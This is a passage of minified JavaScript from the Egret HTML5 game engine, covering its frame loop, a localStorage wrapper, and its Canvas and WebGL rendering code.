                1 > a && (a = 1);
                this.resLoader.thread = a
            };
        a.GROUP_CONFIG = "RES__CONFIG";
        return a
    }(egret.EventDispatcher))
})(RES || (RES = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c) {
            void 0 === c && (c = 60);
            d.call(this);
            this.frameRate = c;
            this._time = 0;
            this._isActivate = !0;
            60 == c && (a.requestAnimationFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame, a.cancelAnimationFrame = window.cancelAnimationFrame || window.msCancelAnimationFrame || window.mozCancelAnimationFrame || window.webkitCancelAnimationFrame || window.oCancelAnimationFrame || window.cancelRequestAnimationFrame ||
            window.msCancelRequestAnimationFrame || window.mozCancelRequestAnimationFrame || window.oCancelRequestAnimationFrame || window.webkitCancelRequestAnimationFrame);
            a.requestAnimationFrame || (a.requestAnimationFrame = function (a) {
                return window.setTimeout(a, 1E3 / c)
            });
            a.cancelAnimationFrame || (a.cancelAnimationFrame = function (a) {
                return window.clearTimeout(a)
            });
            a.instance = this;
            this.registerListener()
        }

        __extends(a, d);
        a.prototype.enterFrame = function () {
            var c = a.instance, d = a._thisObject, e = a._callback, n = b.getTimer(), g = n -
                c._time;
            c._requestAnimationId = a.requestAnimationFrame.call(window, a.prototype.enterFrame);
            e.call(d, g);
            c._time = n
        };
        a.prototype.executeMainLoop = function (c, b) {
            a._callback = c;
            a._thisObject = b;
            this.enterFrame()
        };
        a.prototype.reset = function () {
            var c = a.instance;
            c._requestAnimationId && (c._time = b.getTimer(), a.cancelAnimationFrame.call(window, c._requestAnimationId), c.enterFrame())
        };
        a.prototype.registerListener = function () {
            var c = this, d = function () {
                    c._isActivate && (c._isActivate = !1, b.MainContext.instance.stage.dispatchEvent(new b.Event(b.Event.DEACTIVATE)))
                },
                e = function () {
                    c._isActivate || (c._isActivate = !0, a.instance.reset(), b.MainContext.instance.stage.dispatchEvent(new b.Event(b.Event.ACTIVATE)))
                }, n = function () {
                    document[g] ? d() : e()
                };
            window.addEventListener("focus", e, !1);
            window.addEventListener("blur", d, !1);
            var g, f;
            "undefined" !== typeof document.hidden ? (g = "hidden", f = "visibilitychange") : "undefined" !== typeof document.mozHidden ? (g = "mozHidden", f = "mozvisibilitychange") : "undefined" !== typeof document.msHidden ? (g = "msHidden", f = "msvisibilitychange") : "undefined" !== typeof document.webkitHidden ?
                (g = "webkitHidden", f = "webkitvisibilitychange") : "undefined" !== typeof document.oHidden && (g = "oHidden", f = "ovisibilitychange");
            "onpageshow"in window && "onpagehide"in window && (window.addEventListener("pageshow", e, !1), window.addEventListener("pagehide", d, !1));
            g && f && document.addEventListener(f, n, !1)
        };
        return a
    }(b.DeviceContext);
    b.HTML5DeviceContext = e;
    e.prototype.__class__ = "egret.HTML5DeviceContext"
})(egret || (egret = {}));
var egret_html5_localStorage;
(function (b) {
    b.getItem = function (b) {
        return window.localStorage.getItem(b)
    };
    b.setItem = function (b, d) {
        try {
            return window.localStorage.setItem(b, d), !0
        } catch (a) {
            return console.log("egret_html5_localStorage.setItem\u4fdd\u5b58\u5931\u8d25,key=" + b + "&value=" + d), !1
        }
    };
    b.removeItem = function (b) {
        window.localStorage.removeItem(b)
    };
    b.clear = function () {
        window.localStorage.clear()
    };
    b.init = function () {
        for (var e in b)egret.localStorage[e] = b[e]
    }
})(egret_html5_localStorage || (egret_html5_localStorage = {}));
egret_html5_localStorage.init();
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(a) {
            d.call(this);
            this.globalAlpha = 1;
            this.canvas = a || this.createCanvas();
            this.canvasContext = this.canvas.getContext("2d");
            var b = this.canvasContext.setTransform, e = this;
            this.canvasContext.setTransform = function (a, c, d, h, p, m) {
                e._matrixA = a;
                e._matrixB = c;
                e._matrixC = d;
                e._matrixD = h;
                e._matrixTx = p;
                e._matrixTy = m;
                b.call(e.canvasContext, a, c, d, h, p, m)
            };
            this._matrixA = 1;
            this._matrixC = this._matrixB = 0;
            this._matrixD = 1;
            this._transformTy = this._transformTx = this._matrixTy = this._matrixTx =
                0;
            this.initBlendMode()
        }

        __extends(a, d);
        a.prototype.createCanvas = function () {
            var a = b.Browser.getInstance().$("#egretCanvas");
            if (!a) {
                var d = document.getElementById(b.StageDelegate.canvas_div_name), a = b.Browser.getInstance().$new("canvas");
                a.id = "egretCanvas";
                a.width = b.MainContext.instance.stage.stageWidth;
                a.height = b.MainContext.instance.stage.stageHeight;
                a.style.width = d.style.width;
                a.style.height = d.style.height;
                d.appendChild(a)
            }
            return a
        };
        a.prototype.clearScreen = function () {
            for (var a = b.RenderFilter.getInstance().getDrawAreaList(),
                     d = 0, e = a.length; d < e; d++) {
                var n = a[d];
                this.clearRect(n.x, n.y, n.width, n.height)
            }
            this.renderCost = 0
        };
        a.prototype.clearRect = function (a, b, d, e) {
            this.canvasContext.clearRect(a, b, d, e)
        };
        a.prototype.drawImage = function (a, e, l, n, g, f, h, p, m, q) {
            void 0 === q && (q = void 0);
            var r = b.MainContext.instance.rendererContext.texture_scale_factor;
            e /= r;
            l /= r;
            n /= r;
            g /= r;
            r = a._bitmapData;
            f += this._transformTx;
            h += this._transformTy;
            var t = b.getTimer();
            void 0 === q ? this.canvasContext.drawImage(r, e, l, n, g, f, h, p, m) : this.drawRepeatImage(a, e, l, n, g,
                f, h, p, m, q);
            d.prototype.drawImage.call(this, r, e, l, n, g, f, h, p, m, q);
            this.renderCost += b.getTimer() - t
        };
        a.prototype.drawRepeatImage = function (a, b, d, e, g, f, h, p, m, q) {
            if (void 0 === a.pattern) {
                var r = a._bitmapData, t = r;
                if (r.width != e || r.height != g)t = document.createElement("canvas"), t.width = e, t.height = g, t.getContext("2d").drawImage(r, b, d, e, g, 0, 0, e, g);
                b = this.canvasContext.createPattern(t, q);
                a.pattern = b
            }
            this.canvasContext.fillStyle = a.pattern;
            this.canvasContext.translate(f, h);
            this.canvasContext.fillRect(0, 0, p, m);
            this.canvasContext.translate(-f,
                -h)
        };
        a.prototype.setTransform = function (a) {
            1 == a.a && 0 == a.b && 0 == a.c && 1 == a.d && 1 == this._matrixA && 0 == this._matrixB && 0 == this._matrixC && 1 == this._matrixD ? (this._transformTx = a.tx - this._matrixTx, this._transformTy = a.ty - this._matrixTy) : (this._transformTx = this._transformTy = 0, this._matrixA == a.a && this._matrixB == a.b && this._matrixC == a.c && this._matrixD == a.d && this._matrixTx == a.tx && this._matrixTy == a.ty || this.canvasContext.setTransform(a.a, a.b, a.c, a.d, a.tx, a.ty))
        };
        a.prototype.setAlpha = function (a, d) {
            a != this.globalAlpha &&
            (this.canvasContext.globalAlpha = this.globalAlpha = a);
            d ? (this.blendValue = this.blendModes[d], this.canvasContext.globalCompositeOperation = this.blendValue) : this.blendValue != b.BlendMode.NORMAL && (this.blendValue = this.blendModes[b.BlendMode.NORMAL], this.canvasContext.globalCompositeOperation = this.blendValue)
        };
        a.prototype.initBlendMode = function () {
            this.blendModes = {};
            this.blendModes[b.BlendMode.NORMAL] = "source-over";
            this.blendModes[b.BlendMode.ADD] = "lighter"
        };
        a.prototype.setupFont = function (a) {
            var b = this.canvasContext,
                d = a._italic ? "italic " : "normal ", d = d + (a._bold ? "bold " : "normal "), d = d + (a._size + "px " + a._fontFamily);
            b.font = d;
            b.textAlign = "left";
            b.textBaseline = "middle"
        };
        a.prototype.measureText = function (a) {
            return this.canvasContext.measureText(a).width
        };
        a.prototype.drawText = function (a, b, e, n, g) {
            var f = a._strokeColorString, h = a._stroke, p = this.canvasContext;
            p.fillStyle = a._textColorString;
            p.strokeStyle = f;
            h && (p.lineWidth = 2 * h, p.strokeText(b, e + this._transformTx, n + this._transformTy, g || 65535));
            p.fillText(b, e + this._transformTx,
                n + this._transformTy, g || 65535);
            d.prototype.drawText.call(this, a, b, e, n, g)
        };
        a.prototype.strokeRect = function (a, b, d, e, g) {
            this.canvasContext.strokeStyle = g;
            this.canvasContext.strokeRect(a, b, d, e)
        };
        a.prototype.pushMask = function (a) {
            this.canvasContext.save();
            this.canvasContext.beginPath();
            this.canvasContext.rect(a.x + this._transformTx, a.y + this._transformTy, a.width, a.height);
            this.canvasContext.clip();
            this.canvasContext.closePath()
        };
        a.prototype.popMask = function () {
            this.canvasContext.restore();
            this.canvasContext.setTransform(1,
                0, 0, 1, 0, 0)
        };
        a.prototype.onRenderStart = function () {
            this.canvasContext.save()
        };
        a.prototype.onRenderFinish = function () {
            this.canvasContext.restore();
            this.canvasContext.setTransform(1, 0, 0, 1, 0, 0)
        };
        return a
    }(b.RendererContext);
    b.HTML5CanvasRenderer = e;
    e.prototype.__class__ = "egret.HTML5CanvasRenderer"
})(egret || (egret = {}));
var egret_h5_graphics;
(function (b) {
    b.beginFill = function (b, a) {
        void 0 === a && (a = 1);
        var c = "rgba(" + (b >> 16) + "," + ((b & 65280) >> 8) + "," + (b & 255) + "," + a + ")";
        this.fillStyleColor = c;
        this.commandQueue.push(new e(this._setStyle, this, [c]))
    };
    b.drawRect = function (b, a, c, k) {
        this.commandQueue.push(new e(function (a, c, b, d) {
            var e = this.renderContext;
            this.canvasContext.beginPath();
            this.canvasContext.rect(e._transformTx + a, e._transformTy + c, b, d);
            this.canvasContext.closePath()
        }, this, [b, a, c, k]));
        this._fill()
    };
    b.drawCircle = function (b, a, c) {
        this.commandQueue.push(new e(function (a,
                                               c, b) {
            var d = this.renderContext;
            this.canvasContext.beginPath();
            this.canvasContext.arc(d._transformTx + a, d._transformTy + c, b, 0, 2 * Math.PI);
            this.canvasContext.closePath()
        }, this, [b, a, c]));
        this._fill()
    };
    b.drawRoundRect = function (b, a, c, k, l, n) {
        this.commandQueue.push(new e(function (a, c, b, d, e, k) {
            var l = this.renderContext;
            a = l._transformTx + a;
            c = l._transformTy + c;
            e /= 2;
            k = k ? k / 2 : e;
            b = a + b;
            d = c + d;
            l = d - k;
            this.canvasContext.beginPath();
            this.canvasContext.moveTo(b, l);
            this.canvasContext.quadraticCurveTo(b, d, b - e, d);
            this.canvasContext.lineTo(a +
            e, d);
            this.canvasContext.quadraticCurveTo(a, d, a, d - k);
            this.canvasContext.lineTo(a, c + k);
            this.canvasContext.quadraticCurveTo(a, c, a + e, c);
            this.canvasContext.lineTo(b - e, c);
            this.canvasContext.quadraticCurveTo(b, c, b, c + k);
            this.canvasContext.lineTo(b, l);
            this.canvasContext.closePath()
        }, this, [b, a, c, k, l, n]));
        this._fill()
    };
    b.drawEllipse = function (b, a, c, k) {
        this.commandQueue.push(new e(function (a, c, b, d) {
            var e = this.renderContext;
            this.canvasContext.save();
            a = e._transformTx + a;
            c = e._transformTy + c;
            var e = b > d ? b : d, k = b / e;
            d /=
                e;
            this.canvasContext.scale(k, d);
            this.canvasContext.beginPath();
            this.canvasContext.moveTo((a + b) / k, c / d);
            this.canvasContext.arc(a / k, c / d, e, 0, 2 * Math.PI);
            this.canvasContext.closePath();
            this.canvasContext.restore();
            this.canvasContext.stroke()
        }, this, [b, a, c, k]));
        this._fill()
    };
    b.lineStyle = function (b, a, c, k, l, n, g, f) {
        void 0 === b && (b = NaN);
        void 0 === a && (a = 0);
        void 0 === c && (c = 1);
        void 0 === k && (k = !1);
        void 0 === l && (l = "normal");
        void 0 === n && (n = null);
        void 0 === g && (g = null);
        void 0 === f && (f = 3);
        this.strokeStyleColor && (this.createEndLineCommand(),
            this.commandQueue.push(this.endLineCommand));
        this.strokeStyleColor = a = "rgba(" + (a >> 16) + "," + ((a & 65280) >> 8) + "," + (a & 255) + "," + c + ")";
        this.commandQueue.push(new e(function (a, c) {
            this.canvasContext.lineWidth = a;
            this.canvasContext.strokeStyle = c;
            this.canvasContext.beginPath()
        }, this, [b, a]));
        "undefined" === typeof this.lineX && (this.lineY = this.lineX = 0);
        this.moveTo(this.lineX, this.lineY)
    };
    b.lineTo = function (b, a) {
        this.commandQueue.push(new e(function (a, b) {
            var d = this.renderContext;
            this.canvasContext.lineTo(d._transformTx +
            a, d._transformTy + b)
        }, this, [b, a]));
        this.lineX = b;
        this.lineY = a
    };
    b.curveTo = function (b, a, c, k) {
        this.commandQueue.push(new e(function (a, c, b, d) {
            var e = this.renderContext;
            this.canvasContext.quadraticCurveTo(e._transformTx + a, e._transformTy + c, e._transformTx + b, e._transformTy + d)
        }, this, [b, a, c, k]));
        this.lineX = c;
        this.lineY = k
    };
    b.moveTo = function (b, a) {
        this.commandQueue.push(new e(function (a, b) {
            var d = this.renderContext;
            this.canvasContext.moveTo(d._transformTx + a, d._transformTy + b)
        }, this, [b, a]))
    };
    b.clear = function () {
        this.lineY =
            this.lineX = this.commandQueue.length = 0;
        this.fillStyleColor = this.strokeStyleColor = null
    };
    b.createEndFillCommand = function () {
        this.endFillCommand || (this.endFillCommand = new e(function () {
            this.canvasContext.fill();
            this.canvasContext.closePath()
        }, this, null))
    };
    b.endFill = function () {
        null != this.fillStyleColor && this._fill();
        this.fillStyleColor = null
    };
    b._fill = function () {
        this.fillStyleColor && (this.createEndFillCommand(), this.commandQueue.push(this.endFillCommand))
    };
    b.createEndLineCommand = function () {
        this.endLineCommand ||
        (this.endLineCommand = new e(function () {
            this.canvasContext.stroke();
            this.canvasContext.closePath()
        }, this, null))
    };
    b._draw = function (b) {
        this.renderContext = b;
        b = this.canvasContext = this.renderContext.canvasContext;
        b.save();
        var a = this.commandQueue.length;
        this.strokeStyleColor && 0 < a && this.commandQueue[a - 1] != this.endLineCommand && (this.createEndLineCommand(), this.commandQueue.push(this.endLineCommand), a = this.commandQueue.length);
        for (var c = 0; c < a; c++) {
            var e = this.commandQueue[c];
            e.method.apply(e.thisObject, e.args)
        }
        b.restore()
    };
    var e = function () {
        return function (b, a, c) {
            this.method = b;
            this.thisObject = a;
            this.args = c
        }
    }();
    b._setStyle = function (b) {
        this.canvasContext.fillStyle = b;
        this.canvasContext.beginPath()
    };
    b.init = function () {
        for (var d in b)egret.Graphics.prototype[d] = b[d];
        egret.RendererContext.createRendererContext = function (a) {
            return new egret.HTML5CanvasRenderer(a)
        }
    }
})(egret_h5_graphics || (egret_h5_graphics = {}));
egret_h5_graphics.init();
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(a) {
            d.call(this);
            this.size = 2E3;
            this.vertSize = 5;
            this.contextLost = !1;
            this.glContextId = 0;
            this.currentBlendMode = "";
            this.currentBaseTexture = null;
            this.currentBatchSize = 0;
            this.maskList = [];
            this.maskDataFreeList = [];
            this.canvasContext = document.createElement("canvas").getContext("2d");
            console.log("\u4f7f\u7528WebGL\u6a21\u5f0f");
            this.canvas = a || this.createCanvas();
            this.canvas.addEventListener("webglcontextlost", this.handleContextLost.bind(this), !1);
            this.canvas.addEventListener("webglcontextrestored",
                this.handleContextRestored.bind(this), !1);
            this.projectionX = this.canvas.width / 2;
            this.projectionY = -this.canvas.height / 2;
            a = 6 * this.size;
            this.vertices = new Float32Array(4 * this.size * this.vertSize);
            this.indices = new Uint16Array(a);
            for (var e = 0, l = 0; e < a; e += 6, l += 4)this.indices[e + 0] = l + 0, this.indices[e + 1] = l + 1, this.indices[e + 2] = l + 2, this.indices[e + 3] = l + 0, this.indices[e + 4] = l + 2, this.indices[e + 5] = l + 3;
            this.initWebGL();
            this.shaderManager = new b.WebGLShaderManager(this.gl);
            this.worldTransform = new b.Matrix;
            this.initBlendMode();
            b.MainContext.instance.addEventListener(b.Event.FINISH_RENDER, this._draw, this);
            b.TextField.prototype._draw = function (a) {
                this.getDirty() && (this.cacheAsBitmap = !0);
                b.DisplayObject.prototype._draw.call(this, a)
            }
        }

        __extends(a, d);
        a.prototype.createCanvas = function () {
            var a = b.Browser.getInstance().$("#egretCanvas");
            if (!a) {
                var d = document.getElementById(b.StageDelegate.canvas_div_name), a = b.Browser.getInstance().$new("canvas");
                a.id = "egretCanvas";
                a.width = b.MainContext.instance.stage.stageWidth;
                a.height = b.MainContext.instance.stage.stageHeight;
                a.style.width = d.style.width;
                a.style.height = d.style.height;
                d.appendChild(a)
            }
            return a
        };
        a.prototype.handleContextLost = function () {
            this.contextLost = !0
        };
        a.prototype.handleContextRestored = function () {
            this.initWebGL();
            this.shaderManager.setContext(this.gl);
            this.contextLost = !1
        };
        a.prototype.initWebGL = function () {
            for (var a = {stencil: !0}, b, d = ["experimental-webgl", "webgl"], e = 0; e < d.length; e++) {
                try {
                    b = this.canvas.getContext(d[e], a)
                } catch (g) {
                }
                if (b)break
            }
            if (!b)throw Error("\u5f53\u524d\u6d4f\u89c8\u5668\u4e0d\u652f\u6301webgl");
            this.setContext(b)
        };
        a.prototype.setContext = function (a) {
            this.gl = a;
            a.id = this.glContextId++;
            this.vertexBuffer = a.createBuffer();
            this.indexBuffer = a.createBuffer();
            a.bindBuffer(a.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
            a.bufferData(a.ELEMENT_ARRAY_BUFFER, this.indices, a.STATIC_DRAW);
            a.bindBuffer(a.ARRAY_BUFFER, this.vertexBuffer);
            a.bufferData(a.ARRAY_BUFFER, this.vertices, a.DYNAMIC_DRAW);
            a.disable(a.DEPTH_TEST);
            a.disable(a.CULL_FACE);
            a.enable(a.BLEND);
            a.colorMask(!0, !0, !0, !0)
        };
        a.prototype.initBlendMode = function () {
            this.blendModesWebGL =
            {};
            this.blendModesWebGL[b.BlendMode.NORMAL] = [this.gl.ONE, this.gl.ONE_MINUS_SRC_ALPHA];
            this.blendModesWebGL[b.BlendMode.ADD] = [this.gl.SRC_ALPHA, this.gl.ONE]
        };
        a.prototype.start = function () {
            if (!this.contextLost) {
                var a = this.gl;
                a.activeTexture(a.TEXTURE0);
                a.bindBuffer(a.ARRAY_BUFFER, this.vertexBuffer);
                a.bindBuffer(a.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
                var b;
                b = this.colorTransformMatrix ? this.shaderManager.colorTransformShader : this.shaderManager.defaultShader;
                this.shaderManager.activateShader(b);
                b.syncUniforms();
                a.uniform2f(b.projectionVector, this.projectionX, this.projectionY);
                var d = 4 * this.vertSize;
                a.vertexAttribPointer(b.aVertexPosition, 2, a.FLOAT, !1, d, 0);
                a.vertexAttribPointer(b.aTextureCoord, 2, a.FLOAT, !1, d, 8);
                a.vertexAttribPointer(b.colorAttribute, 2, a.FLOAT, !1, d, 16)
            }
        };
        a.prototype.clearScreen = function () {
            var a = this.gl;
            a.colorMask(!0, !0, !0, !0);
            for (var d = b.RenderFilter.getInstance().getDrawAreaList(), e = 0, n = d.length; e < n; e++) {
                var g = d[e];
                a.viewport(g.x, g.y, g.width, g.height);
                a.bindFramebuffer(a.FRAMEBUFFER, null);
                a.clearColor(0, 0, 0, 0);
                a.clear(a.COLOR_BUFFER_BIT)
            }
            this.renderCost = 0
        };
        a.prototype.setBlendMode = function (a) {
            a || (a = b.BlendMode.NORMAL);
            if (this.currentBlendMode != a) {
                var d = this.blendModesWebGL[a];
                d && (this._draw(), this.gl.blendFunc(d[0], d[1]), this.currentBlendMode = a)
            }
        };
        a.prototype.drawRepeatImage = function (a, b, d, e, g, f, h, p, m, q) {
            for (; f < p; f += e)for (q = h; q < m; q += g) {
                var r = Math.min(e, p - f), t = Math.min(g, m - q);
                this.drawImage(a, b, d, r, t, f, q, r, t)
            }
        };
        a.prototype.drawImage = function (a, d, e, n, g, f, h, p, m, q) {
            void 0 === q && (q = void 0);
            if (!this.contextLost)if (void 0 !== q)this.drawRepeatImage(a, d, e, n, g, f, h, p, m, q); else {
                q = b.MainContext.instance.rendererContext.texture_scale_factor;
                d /= q;
                e /= q;
                n /= q;
                g /= q;
                this.createWebGLTexture(a);
                if (a.webGLTexture !== this.currentBaseTexture || this.currentBatchSize >= this.size)this._draw(), this.currentBaseTexture = a.webGLTexture;
                var r = this.worldTransform, t = r.a, s = r.b, u = r.c, y = r.d, v = r.tx, z = r.ty;
                0 == f && 0 == h || r.append(1, 0, 0, 1, f, h);
                1 == n / p && 1 == g / m || r.append(p / n, 0, 0, m / g, 0, 0);
                f = r.a;
                h = r.b;
                p = r.c;
                m = r.d;
                q = r.tx;
                var x = r.ty;
                r.a = t;
                r.b = s;
                r.c = u;
                r.d = y;
                r.tx = v;
                r.ty = z;
                t = a._sourceWidth;
                s = a._sourceHeight;
                a = n;
                r = g;
                d /= t;
                e /= s;
                n /= t;
                g /= s;
                t = this.vertices;
                s = 4 * this.currentBatchSize * this.vertSize;
                u = this.worldAlpha;
                t[s++] = q;
                t[s++] = x;
                t[s++] = d;
                t[s++] = e;
                t[s++] = u;
                t[s++] = f * a + q;
                t[s++] = h * a + x;
                t[s++] = n + d;
                t[s++] = e;
                t[s++] = u;
                t[s++] = f * a + p * r + q;
                t[s++] = m * r + h * a + x;
                t[s++] = n + d;
                t[s++] = g + e;
                t[s++] = u;
                t[s++] = p * r + q;
                t[s++] = m * r + x;
                t[s++] = d;
                t[s++] = g + e;
                t[s++] = u;
                this.currentBatchSize++
            }
        };
        a.prototype._draw = function () {
            if (0 != this.currentBatchSize && !this.contextLost) {
                var a =
                    b.getTimer();
                this.start();
                var d = this.gl;
                d.bindTexture(d.TEXTURE_2D, this.currentBaseTexture);
                var e = this.vertices.subarray(0, 4 * this.currentBatchSize * this.vertSize);
                d.bufferSubData(d.ARRAY_BUFFER, 0, e);
                d.drawElements(d.TRIANGLES, 6 * this.currentBatchSize, d.UNSIGNED_SHORT, 0);
                this.currentBatchSize = 0;
                this.renderCost += b.getTimer() - a;
                b.Profiler.getInstance().onDrawImage()
            }
        };
        a.prototype.setTransform = function (a) {
            var b = this.worldTransform;
            b.a = a.a;
            b.b = a.b;
            b.c = a.c;
            b.d = a.d;
            b.tx = a.tx;
            b.ty = a.ty
        };
        a.prototype.setAlpha =
            function (a, b) {
                this.worldAlpha = a;
                this.setBlendMode(b)
            };
        a.prototype.createWebGLTexture = function (a) {
            if (!a.webGLTexture) {
                var b = this.gl;
                a.webGLTexture = b.createTexture();
                b.bindTexture(b.TEXTURE_2D, a.webGLTexture);
                b.pixelStorei(b.UNPACK_PREMULTIPLY_ALPHA_WEBGL, !0);
                b.texImage2D(b.TEXTURE_2D, 0, b.RGBA, b.RGBA, b.UNSIGNED_BYTE, a._bitmapData);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_MAG_FILTER, b.LINEAR);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_MIN_FILTER, b.LINEAR);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_WRAP_S, b.CLAMP_TO_EDGE);
                b.texParameteri(b.TEXTURE_2D, b.TEXTURE_WRAP_T, b.CLAMP_TO_EDGE);
                b.bindTexture(b.TEXTURE_2D, null)
            }
        };
        a.prototype.pushMask = function (a) {
            this._draw();
            var b = this.gl;
            0 == this.maskList.length && (b.enable(b.STENCIL_TEST), b.stencilFunc(b.ALWAYS, 1, 1));
            var d = this.maskDataFreeList.pop();
            d ? (d.x = a.x, d.y = a.y, d.w = a.width, d.h = a.height) : d = {x: a.x, y: a.y, w: a.width, h: a.height};
            this.maskList.push(d);
            b.colorMask(!1, !1, !1, !1);
            b.stencilOp(b.KEEP, b.KEEP, b.INCR);
            this.renderGraphics(d);
            b.colorMask(!0, !0, !0, !0);
            b.stencilFunc(b.NOTEQUAL,
                0, this.maskList.length);
            b.stencilOp(b.KEEP, b.KEEP, b.KEEP)
        };
        a.prototype.popMask = function () {
            this._draw();
            var a = this.gl, b = this.maskList.pop();
            b && (a.colorMask(!1, !1, !1, !1), a.stencilOp(a.KEEP, a.KEEP, a.DECR), this.renderGraphics(b), a.colorMask(!0, !0, !0, !0), a.stencilFunc(a.NOTEQUAL, 0, this.maskList.length), a.stencilOp(a.KEEP, a.KEEP, a.KEEP), this.maskDataFreeList.push(b));
            0 == this.maskList.length && a.disable(a.STENCIL_TEST)
        };
        a.prototype.setGlobalColorTransform = function (a) {
            if (this.colorTransformMatrix != a && (this._draw(),
                    this.colorTransformMatrix = a)) {
                a = a.concat();
                var b = this.shaderManager.colorTransformShader;
                b.uniforms.colorAdd.value.w = a.splice(19, 1)[0] / 255;
                b.uniforms.colorAdd.value.z = a.splice(14, 1)[0] / 255;
                b.uniforms.colorAdd.value.y = a.splice(9, 1)[0] / 255;
                b.uniforms.colorAdd.value.x = a.splice(4, 1)[0] / 255;
                b.uniforms.matrix.value = a
            }
        };
        a.prototype.setupFont = function (a) {
            var b = this.canvasContext, d = a.italic ? "italic " : "normal ", d = d + (a.bold ? "bold " : "normal "), d = d + (a.size + "px " + a.fontFamily);
            b.font = d;
            b.textAlign = "left";
            b.textBaseline =
                "middle"
        };
        a.prototype.measureText = function (a) {
            return this.canvasContext.measureText(a).width
        };
        a.prototype.renderGraphics = function (a) {
            var b = this.gl, d = this.shaderManager.primitiveShader;
            this.graphicsPoints ? (this.graphicsPoints.length = 0, this.graphicsIndices.length = 0) : (this.graphicsPoints = [], this.graphicsIndices = [], this.graphicsBuffer = b.createBuffer(), this.graphicsIndexBuffer = b.createBuffer());
            this.updateGraphics(a);
            this.shaderManager.activateShader(d);
            b.blendFunc(b.ONE, b.ONE_MINUS_SRC_ALPHA);
            b.uniformMatrix3fv(d.translationMatrix,
                !1, this.worldTransform.toArray(!0));
            b.uniform2f(d.projectionVector, this.projectionX, -this.projectionY);
            b.uniform2f(d.offsetVector, 0, 0);
            b.uniform3fv(d.tintColor, [1, 1, 1]);
            b.uniform1f(d.alpha, this.worldAlpha);
            b.bindBuffer(b.ARRAY_BUFFER, this.graphicsBuffer);
            b.vertexAttribPointer(d.aVertexPosition, 2, b.FLOAT, !1, 24, 0);
            b.vertexAttribPointer(d.colorAttribute, 4, b.FLOAT, !1, 24, 8);
            b.bindBuffer(b.ELEMENT_ARRAY_BUFFER, this.graphicsIndexBuffer);
            b.drawElements(b.TRIANGLE_STRIP, this.graphicsIndices.length, b.UNSIGNED_SHORT,
                0);
            this.shaderManager.activateShader(this.shaderManager.defaultShader)
        };
        a.prototype.updateGraphics = function (a) {
            var b = this.gl;
            this.buildRectangle(a);
            b.bindBuffer(b.ARRAY_BUFFER, this.graphicsBuffer);
            b.bufferData(b.ARRAY_BUFFER, new Float32Array(this.graphicsPoints), b.STATIC_DRAW);
            b.bindBuffer(b.ELEMENT_ARRAY_BUFFER, this.graphicsIndexBuffer);
            b.bufferData(b.ELEMENT_ARRAY_BUFFER, new Uint16Array(this.graphicsIndices), b.STATIC_DRAW)
        };
        a.prototype.buildRectangle = function (a) {
            var b = a.x, d = a.y, e = a.w;
            a = a.h;
            var g =
                this.graphicsPoints, f = this.graphicsIndices, h = g.length / 6;
            g.push(b, d);
            g.push(0, 0, 0, 1);
            g.push(b + e, d);
            g.push(0, 0, 0, 1);
            g.push(b, d + a);
            g.push(0, 0, 0, 1);
            g.push(b + e, d + a);
            g.push(0, 0, 0, 1);
            f.push(h, h, h + 1, h + 2, h + 3, h + 3)
        };
        return a
    }(b.RendererContext);
    b.WebGLRenderer = e;
    e.prototype.__class__ = "egret.WebGLRenderer"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.compileProgram = function (a, c, e) {
            e = b.compileFragmentShader(a, e);
            c = b.compileVertexShader(a, c);
            var l = a.createProgram();
            a.attachShader(l, c);
            a.attachShader(l, e);
            a.linkProgram(l);
            a.getProgramParameter(l, a.LINK_STATUS) || console.log("\u65e0\u6cd5\u521d\u59cb\u5316\u7740\u8272\u5668");
            return l
        };
        b.compileFragmentShader = function (a, c) {
            return b._compileShader(a, c, a.FRAGMENT_SHADER)
        };
        b.compileVertexShader = function (a, c) {
            return b._compileShader(a, c, a.VERTEX_SHADER)
        };
        b._compileShader =
            function (a, b, d) {
                d = a.createShader(d);
                a.shaderSource(d, b);
                a.compileShader(d);
                return a.getShaderParameter(d, a.COMPILE_STATUS) ? d : (console.log(a.getShaderInfoLog(d)), null)
            };
        b.checkCanUseWebGL = function () {
            if (void 0 == b.canUseWebGL)try {
                var a = document.createElement("canvas");
                b.canUseWebGL = !!window.WebGLRenderingContext && !(!a.getContext("webgl") && !a.getContext("experimental-webgl"))
            } catch (c) {
                b.canUseWebGL = !1
            }
            return b.canUseWebGL
        };
        return b
    }();
    b.WebGLUtils = e;
    e.prototype.__class__ = "egret.WebGLUtils"
})(egret || (egret =
{}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function () {
        function b(a) {
            this.maxAttibs = 10;
            this.attribState = [];
            this.tempAttribState = [];
            for (var c = 0; c < this.maxAttibs; c++)this.attribState[c] = !1;
            this.setContext(a)
        }

        b.prototype.setContext = function (b) {
            this.gl = b;
            this.primitiveShader = new c(b);
            this.defaultShader = new d(b);
            this.colorTransformShader = new a(b);
            this.activateShader(this.defaultShader)
        };
        b.prototype.activateShader = function (a) {
            this.currentShader != a && (this.gl.useProgram(a.program), this.setAttribs(a.attributes), this.currentShader =
                a)
        };
        b.prototype.setAttribs = function (a) {
            var b, c;
            c = this.tempAttribState.length;
            for (b = 0; b < c; b++)this.tempAttribState[b] = !1;
            c = a.length;
            for (b = 0; b < c; b++)this.tempAttribState[a[b]] = !0;
            a = this.gl;
            c = this.attribState.length;
